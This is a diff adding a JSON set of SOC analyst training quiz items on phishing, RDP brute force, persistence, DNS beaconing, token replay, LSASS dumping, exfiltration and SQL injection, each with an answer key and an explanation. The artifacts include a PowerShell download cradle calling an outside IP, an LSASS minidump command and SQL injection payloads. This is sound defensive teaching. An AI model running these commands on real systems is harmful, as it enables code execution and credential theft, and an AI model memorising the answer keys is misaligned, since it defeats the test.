@@ -1,0 +1,230 @@
+[
+  {
+    "slug": "spoofed-m365-alert",
+    "title": "The Urgent Mailbox Warning",
+    "category": "phishing",
+    "difficulty": 1,
+    "scenario": "A user in Accounts Payable forwarded this email to the SOC asking if it is real. They have **not** clicked anything yet. You pulled the headers from the message trace.",
+    "artifact_type": "email",
+    "artifact": "From: \"Microsoft 365 Security\" <no-reply@m365-account-verify.example>\nReply-To: helpdesk.recovery@freemail.example\nTo: jsmith@contoso.example\nSubject: ACTION REQUIRED: Mailbox will be suspended in 24 hours\nReturn-Path: <bounce@bulk-sender.example>\nReceived: from mail.bulk-sender.example (203.0.113.45)\nAuthentication-Results: mx.contoso.example;\n   spf=fail (sender IP is 203.0.113.45) smtp.mailfrom=bulk-sender.example;\n   dkim=none (message not signed);\n   dmarc=fail action=none header.from=m365-account-verify.example\n\nBody:\nYour mailbox storage has exceeded its limit. Verify your account now\nto avoid permanent suspension:\nhxxps://m365-account-verify.example/login?u=jsmith",
+    "question": "Which finding is the strongest evidence that this email is malicious?",
+    "choices": [
+      "The subject line uses all capital letters",
+      "SPF and DMARC both fail, and the Reply-To points to an unrelated free mail domain",
+      "The email was sent to only one recipient",
+      "The body mentions mailbox storage limits"
+    ],
+    "correct_index": 1,
+    "explanation": "Urgent wording is a red flag, but it is not proof. The technical evidence is what matters: the sending IP is not authorized for the domain (SPF fail), the message is unsigned (no DKIM), DMARC fails, and replies would go to a free mail account instead of Microsoft. The lookalike domain hosting a login page completes the picture of a credential phishing attempt. Next steps: block the sender domain and URL, search for other recipients, and confirm nobody entered credentials.",
+    "attack_technique": "T1566.002"
+  },
+  {
+    "slug": "rdp-brute-force-success",
+    "title": "Forty Failures and a Success",
+    "category": "windows_logs",
+    "difficulty": 1,
+    "scenario": "Your SIEM fired a correlation alert on a jump server that is exposed to the internet for a vendor. Here is a condensed view of the Security log.",
+    "artifact_type": "log",
+    "artifact": "TimeCreated          EventID  Account          LogonType  SourceIP\n2026-10-26 02:11:04  4625     administrator    10         198.51.100.23\n2026-10-26 02:11:05  4625     admin            10         198.51.100.23\n2026-10-26 02:11:06  4625     svc_backup       10         198.51.100.23\n...               (37 more 4625 events, same source, 1 to 2 seconds apart)\n2026-10-26 02:12:19  4625     vendor_rdp       10         198.51.100.23\n2026-10-26 02:12:21  4624     vendor_rdp       10         198.51.100.23\n2026-10-26 02:12:40  4672     vendor_rdp       -          -",
+    "question": "What is the most accurate assessment of this activity?",
+    "choices": [
+      "A user forgot their password and eventually remembered it",
+      "Normal vendor activity, since the account that logged in is a known vendor account",
+      "A successful RDP password guessing attack that ended in an interactive logon with special privileges",
+      "A failed attack, because most attempts were rejected"
+    ],
+    "correct_index": 2,
+    "explanation": "Event 4625 is a failed logon and 4624 is a successful one. Logon type 10 is RemoteInteractive (RDP). Dozens of failures across many account names, one or two seconds apart from one external IP, is automated guessing. The final 4624 means the attacker got in, and 4672 shows special privileges were assigned to the new session. Treat this as a confirmed compromise: isolate the host, disable the account, and review what happened after 02:12.",
+    "attack_technique": "T1110.001"
+  },
+  {
+    "slug": "encoded-powershell",
+    "title": "Hidden Window, Encoded Command",
+    "category": "windows_logs",
+    "difficulty": 2,
+    "scenario": "EDR flagged a process launched by **WINWORD.EXE** on a finance laptop. You decoded the Base64 argument for convenience.",
+    "artifact_type": "log",
+    "artifact": "ParentImage:  C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nImage:        C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine:  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...\n\nDecoded (UTF-16LE):\nIEX (New-Object Net.WebClient).DownloadString('hxxp://203.0.113.77/a.ps1')",
+    "question": "What is this command most likely doing?",
+    "choices": [
+      "Downloading a script from a remote server and running it directly in memory",
+      "Installing a legitimate Microsoft Office update",
+      "Encrypting files on the local disk",
+      "Checking the laptop's internet connectivity"
+    ],
+    "correct_index": 0,
+    "explanation": "This is a classic download cradle. DownloadString fetches a script as text and IEX (Invoke-Expression) executes it in memory without writing a file to disk. The flags -nop (no profile), -w hidden (hidden window), and -enc (Base64 encoded command) are common evasion choices. A Word document spawning PowerShell almost always points to a malicious macro. Isolate the host, block the IP, and collect the original document.",
+    "attack_technique": "T1059.001"
+  },
+  {
+    "slug": "scheduled-task-persistence",
+    "title": "The Updater That Isn't",
+    "category": "windows_logs",
+    "difficulty": 2,
+    "scenario": "During a follow-up hunt on a host that was cleaned last week, you find this event.",
+    "artifact_type": "log",
+    "artifact": "EventID:      4698 (A scheduled task was created)\nSubject:      CONTOSO\\mlee\nTask Name:    \\Microsoft\\Windows\\Update\\ChromeUpdaterSvc\nTrigger:      At logon of any user; repeat every 30 minutes\nAction:       C:\\Users\\mlee\\AppData\\Roaming\\svch0st.exe --silent\nRunLevel:     HighestAvailable",
+    "question": "Why is this task suspicious?",
+    "choices": [
+      "Scheduled tasks are always malicious",
+      "It runs every 30 minutes, which uses too much CPU",
+      "It was created by a domain user instead of SYSTEM",
+      "It is disguised as a browser updater but runs a misspelled system binary from a user's AppData folder"
+    ],
+    "correct_index": 3,
+    "explanation": "Plenty of legitimate software uses scheduled tasks, so the details matter. Here the task hides under a Microsoft path with a Chrome name, yet it launches svch0st.exe (zero instead of the letter o) from AppData\\Roaming, a user-writable location real system binaries never run from. Running at every logon and repeating every 30 minutes is a persistence pattern, which explains why the host became active again after cleanup.",
+    "attack_technique": "T1053.005"
+  },
+  {
+    "slug": "dns-beaconing",
+    "title": "Like Clockwork",
+    "category": "network",
+    "difficulty": 2,
+    "scenario": "A threat hunt query for rare domains returned this pattern from one workstation's DNS logs.",
+    "artifact_type": "log",
+    "artifact": "Timestamp            Client       Query                                           Type\n2026-10-26 13:00:02  10.20.4.118  a9f3k2l1q8.cdn-telemetry.example                TXT\n2026-10-26 13:01:02  10.20.4.118  m2x8v7c1z0.cdn-telemetry.example                TXT\n2026-10-26 13:02:03  10.20.4.118  q7w1e5r9t3.cdn-telemetry.example                TXT\n2026-10-26 13:03:02  10.20.4.118  z0p4o8i2u6.cdn-telemetry.example                TXT\n... (pattern continues every ~60 seconds for 9 hours)\n\nDomain age: 3 days    Other internal clients querying it: 0",
+    "question": "What does this pattern most strongly suggest?",
+    "choices": [
+      "A misconfigured printer",
+      "Command and control traffic over DNS",
+      "A normal CDN that is load balancing",
+      "The user browsing many websites"
+    ],
+    "correct_index": 1,
+    "explanation": "Three things stand out: a steady 60 second interval (beaconing), unique random looking subdomains on every request (data encoded into the query), and TXT record lookups, which can carry data back to the client. Add a three day old domain that no other host talks to, and this looks like a DNS based C2 channel. Pull the process making the queries from EDR and sinkhole the domain.",
+    "attack_technique": "T1071.004"
+  },
+  {
+    "slug": "impossible-travel",
+    "title": "Two Cities, Nineteen Minutes",
+    "category": "cloud",
+    "difficulty": 1,
+    "scenario": "An identity protection alert fired for a sales manager. These are her recent Entra ID sign-ins.",
+    "artifact_type": "log",
+    "artifact": "Time (UTC)           User                     App              IP             Location          Result   MFA\n2026-10-26 14:02:11  rpatel@contoso.example   Outlook Mobile   192.0.2.14     Troy, MI, US      Success  Satisfied (app)\n2026-10-26 14:21:37  rpatel@contoso.example   Office 365 Web   198.51.100.90  Frankfurt, DE     Success  Satisfied (claim in token)\n2026-10-26 14:22:05  rpatel@contoso.example   Exchange Online  198.51.100.90  Frankfurt, DE     Success  -\n\nNote: 198.51.100.90 belongs to a commercial hosting provider. User is not traveling.",
+    "question": "What is the most likely explanation, and why didn't MFA stop it?",
+    "choices": [
+      "The user is on a VPN, so this is a false positive",
+      "The attacker guessed the password and MFA was disabled",
+      "A stolen session token was replayed from the hosting IP, so MFA was already satisfied by the token",
+      "Entra ID logged the wrong location"
+    ],
+    "correct_index": 2,
+    "explanation": "The user cannot physically move from Michigan to Germany in 19 minutes, and she is not traveling. The key clue is MFA \"satisfied (claim in token)\": the second session did not complete a fresh MFA prompt, it presented a token that already had the MFA claim. That is typical of adversary in the middle phishing kits that steal session cookies. Revoke all sessions, reset the password, and check for new inbox rules or MFA methods.",
+    "attack_technique": "T1550.004"
+  },
+  {
+    "slug": "lsass-minidump",
+    "title": "Who Touched LSASS?",
+    "category": "windows_logs",
+    "difficulty": 3,
+    "scenario": "Sysmon on a file server produced these two events within seconds of each other.",
+    "artifact_type": "log",
+    "artifact": "Sysmon EventID 1 (Process Create)\n  Image:        C:\\Windows\\System32\\rundll32.exe\n  CommandLine:  rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\ProgramData\\d.bin full\n  User:         CONTOSO\\it_admin2\n\nSysmon EventID 10 (Process Access)\n  SourceImage:  C:\\Windows\\System32\\rundll32.exe\n  TargetImage:  C:\\Windows\\System32\\lsass.exe   (PID 712)\n  GrantedAccess: 0x1FFFFF",
+    "question": "What is happening on this server?",
+    "choices": [
+      "Windows Error Reporting is collecting a crash dump",
+      "An administrator is running routine disk cleanup",
+      "Antivirus is scanning the LSASS process",
+      "Someone is dumping LSASS memory to steal credentials using a built-in Windows DLL"
+    ],
+    "correct_index": 3,
+    "explanation": "LSASS holds credential material for logged-on users. Calling the MiniDump export of comsvcs.dll through rundll32 is a well known living off the land technique to write LSASS memory to disk (here d.bin), which can then be parsed offline for hashes and tickets. The full access mask 0x1FFFFF confirms complete process access. Assume every account that logged into this server is exposed and reset credentials after containing the host.",
+    "attack_technique": "T1003.001"
+  },
+  {
+    "slug": "log-cleared",
+    "title": "Silence in the Logs",
+    "category": "windows_logs",
+    "difficulty": 1,
+    "scenario": "A domain controller stopped sending events to the SIEM for 40 minutes. When it resumed, this was the first event received.",
+    "artifact_type": "log",
+    "artifact": "EventID:    1102\nSource:     Microsoft-Windows-Eventlog\nMessage:    The audit log was cleared.\nSubject:    Account Name:  svc_sql\n            Account Domain: CONTOSO\n            Logon ID:      0x3E7A21\nTime:       2026-10-26 23:48:12",
+    "question": "What is the best interpretation?",
+    "choices": [
+      "Likely anti-forensics: someone erased the Security log, and a service account doing it is a strong red flag",
+      "Routine log rotation that Windows performs automatically",
+      "The SIEM agent crashed and reinstalled itself",
+      "Nothing to worry about, since no errors were reported"
+    ],
+    "correct_index": 0,
+    "explanation": "Event 1102 is written when someone manually clears the Security log. Windows rotates or archives logs without generating 1102. Attackers clear logs to hide their tracks, and a SQL service account has no business clearing logs on a domain controller. Treat the 40 minute gap as a period of unknown activity: check other data sources (EDR, network, neighboring hosts) and investigate the svc_sql account.",
+    "attack_technique": "T1070.001"
+  },
+  {
+    "slug": "smb-sweep",
+    "title": "Knocking on Every Door",
+    "category": "network",
+    "difficulty": 2,
+    "scenario": "Firewall logs between internal VLANs show this from a single workstation in HR.",
+    "artifact_type": "log",
+    "artifact": "Time      Src           Dst           DstPort  Action\n09:14:01  10.30.8.52    10.30.1.1     445      allow\n09:14:01  10.30.8.52    10.30.1.2     445      allow\n09:14:01  10.30.8.52    10.30.1.3     445      deny\n09:14:02  10.30.8.52    10.30.1.4     445      allow\n...       (sequential through 10.30.1.254, then 10.30.2.1 onward)\n09:16:40  10.30.8.52    10.30.3.211   445      allow\n\nTotal: 1,486 unique destinations in 2m39s. Baseline for this host: 3 to 5 SMB peers per day.",
+    "question": "What is the most likely activity?",
+    "choices": [
+      "The user is copying files to a single file share",
+      "Windows Update downloading patches",
+      "Network discovery for lateral movement, scanning for hosts with SMB open",
+      "A DHCP lease renewal"
+    ],
+    "correct_index": 2,
+    "explanation": "Sequential destination IPs, all on port 445, at machine speed, far beyond the host's normal 3 to 5 SMB peers, is a scan. An HR workstation has no reason to touch nearly 1,500 hosts. Attackers and worms do this to find targets for lateral movement or ransomware spread. Isolate the workstation and look for the process opening these connections.",
+    "attack_technique": "T1046"
+  },
+  {
+    "slug": "rclone-exfil",
+    "title": "The Late Night Upload",
+    "category": "network",
+    "difficulty": 2,
+    "scenario": "A data loss alert triggered on outbound volume from an engineering file server. Proxy logs below.",
+    "artifact_type": "log",
+    "artifact": "Time      Src          User         Method  Host                              Bytes Out     User-Agent\n01:03:17  10.40.2.15   svc_files    PUT     storage.cloud-drive.example       524,288,000   rclone/v1.6x\n01:04:02  10.40.2.15   svc_files    PUT     storage.cloud-drive.example       524,288,000   rclone/v1.6x\n01:04:51  10.40.2.15   svc_files    PUT     storage.cloud-drive.example       524,288,000   rclone/v1.6x\n... (212 more PUT requests)\n\nTotal outbound: ~108 GB between 01:03 and 03:41. Company does not use this cloud provider.",
+    "question": "What should the analyst conclude?",
+    "choices": [
+      "A scheduled backup to the company's approved cloud",
+      "Probable data exfiltration using a common file sync tool to an unsanctioned cloud service",
+      "A software update for the file server",
+      "Normal web browsing by the service account"
+    ],
+    "correct_index": 1,
+    "explanation": "Rclone is a legitimate sync tool that ransomware groups frequently use to steal data before encrypting it. A service account uploading over 100 GB after hours, in uniform 500 MB chunks, to a cloud provider the company does not use, is consistent with exfiltration. Block the destination, contain the server, and determine what data left: this may trigger breach notification obligations.",
+    "attack_technique": "T1567.002"
+  },
+  {
+    "slug": "sqli-web-logs",
+    "title": "OR 1=1",
+    "category": "web",
+    "difficulty": 1,
+    "scenario": "The web application firewall is in monitor mode. Here are access logs from the customer portal.",
+    "artifact_type": "log",
+    "artifact": "203.0.113.200 - - [26/Oct/2026:16:40:01] \"GET /products?id=12 HTTP/1.1\" 200 5120\n203.0.113.200 - - [26/Oct/2026:16:40:03] \"GET /products?id=12' HTTP/1.1\" 500 312\n203.0.113.200 - - [26/Oct/2026:16:40:05] \"GET /products?id=12' OR '1'='1 HTTP/1.1\" 200 98304\n203.0.113.200 - - [26/Oct/2026:16:40:09] \"GET /products?id=12 UNION SELECT username,password FROM users-- HTTP/1.1\" 200 45021\nUser-Agent (all requests): sqlmap/1.8",
+    "question": "What is the most serious conclusion from these logs?",
+    "choices": [
+      "SQL injection attempts that appear successful, possibly exposing user credentials",
+      "A customer mistyped the product ID several times",
+      "A denial of service attack",
+      "Harmless scanning, because the WAF is in place"
+    ],
+    "correct_index": 0,
+    "explanation": "The single quote causing a 500 error shows the input reaches the database unsanitized. The OR '1'='1 request then returns a much larger response (about 98 KB versus 5 KB), and the UNION SELECT against the users table returns 200 with 45 KB of data, suggesting it worked. The sqlmap user agent confirms an automated injection tool. A WAF in monitor mode only logs, it does not block. Escalate as a likely data breach and fix the vulnerable parameter.",
+    "attack_technique": "T1190"
+  },
+  {
+    "slug": "approved-scanner-fp",
+    "title": "The Noisy Neighbor",
+    "category": "network",
+    "difficulty": 2,
+    "scenario": "Your IDS fired 2,300 alerts overnight from one internal IP. Before escalating, you check the asset inventory and change calendar.",
+    "artifact_type": "alert",
+    "artifact": "IDS Alert Summary (00:00 to 04:00)\n  Source:        10.10.0.25\n  Signatures:    ET SCAN Nmap Scripting Engine User-Agent; ET SCAN Possible SSL Scan;\n                 GPL ATTACK_RESPONSE id check returned root (0 hits)\n  Destinations:  10.20.0.0/16 (all subnets in scope)\n\nAsset Inventory:  10.10.0.25 = vulnscan01, owner: Vulnerability Mgmt team\nChange Calendar:  CHG-4471 \"Monthly authenticated vulnerability scan\", Sun 00:00 to 05:00\nEDR on vulnscan01: no new processes, users, or outbound connections outside 10.20.0.0/16",
+    "question": "What is the best disposition for this alert?",
+    "choices": [
+      "True positive: an attacker is scanning the network, escalate to incident response",
+      "Ignore all future alerts from this IP permanently",
+      "Benign true positive: real scanning activity, but authorized. Close with the change ticket referenced and consider tuning",
+      "Shut down vulnscan01 immediately"
+    ],
+    "correct_index": 2,
+    "explanation": "The IDS was right that scanning happened, so this is not a false detection, but the activity is expected: the source is the vulnerability scanner, the timing matches an approved change window, the scope matches, and EDR shows nothing unusual on the scanner. Close it as benign and cite CHG-4471. Permanent blanket suppression is risky, because a compromised scanner would then be invisible. A better tuning option is suppressing these signatures only during the approved window.",
+    "attack_technique": "T1046"
+  }
+]
